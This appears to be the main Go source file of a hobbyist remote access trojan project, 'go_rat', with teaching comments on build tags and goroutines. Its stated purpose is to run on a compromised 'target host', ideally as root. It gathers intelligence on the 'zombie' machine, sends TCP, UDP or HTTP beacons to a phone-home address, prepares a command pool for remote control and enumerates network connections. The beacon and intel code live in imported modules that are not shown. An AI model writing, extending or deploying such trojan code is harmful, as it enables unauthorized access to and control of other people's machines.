/*/
This is the file that will be compiled into the binary
	that gets placed on the target host

We are using the feature outlined in :
	- https://golang.org/cmd/go/#hdr-Build_constraints

	Placing the tag "+build some_tag_here"
		as a comment "//"
		at the top of the file
		and using "go build -tags some_tag_here"

	will compile main.go with code from that file mixed in

/*/
package target_binary

// import the libraries we need
import (
	/*/
	IMPORTING MODULES FROM GOMODCACHE DIRECTORY
		A useful way to make multiple binaries with common code
		- depends on the folder structure and module naming
		- gomodcache is also, invisibly, the pkg directory in the workspace


	/*/
	"go_rat/pkg/shared_code"
	"go_rat/pkg/shared_code/Beacons"
	"go_rat/pkg/shared_code/Core"
	"go_rat/pkg/shared_code/Intel"
)

/*
control flow for main rat code
*/

// once placed on the target host and executed post exploitation, prefferably with root
/// level permissions, We need to:
//	- send a beacon with a conditional dependant on environment/preference
// 	- run the input/output operations if that environment is right
//  - enumerate host intel, either passively or aggressively
//  - enumerate network information
//  - enumerate further vulnerabilities
//
// regardless of the beacon state, and anything else. I am going to instantiate a
// new CommandSet pool to handle anything we send/receive later...
// we know where this zombie is... right?
// are we even doin this in the right hekin order?
// what determines the right order anyways?!!?

func main() {
	/*/
	  A goroutine is a lightweight thread managed by the Go runtime.
	  	go f(x, y, z)
	  starts a new goroutine running
	  	f(x, y, z)
	  The evaluation of f, x, y, and z happens in the current goroutine and the execution
	  of f happens in the new goroutine.
	  Goroutines run in the same address space, so access to shared memory must be synchronized
	  /*/

	// you should code these struct constructors to accept parameters to assign values
	// or should I? This is stil in development
	CommandPool := shared_code.NewCommandSet()
	ZombieInformation := shared_code.NewHostIntel()

	// start gathering all the info
	// even though the Intel Folder/Module is in the shared_code module
	// we call it by it's module name anyways. This is why we should use unique names
	Intel.GatherIntel(ZombieInformation)

	if Core.BEACON_ON_START == true {
		switch Core.BACON_TYPE {
		case "tcp":
			go Beacons.BaconTCP(Core.PHONEHOME_TCP)
		case "udp":
			go Beacons.BeaconUDP(Core.PHONEHOME_UDP)
		case "http":
			// function to call other beacons depending on second param
			go Beacons.BeaconHTTP()
		}
	}
	shared_code.GetTCPConnections()
}
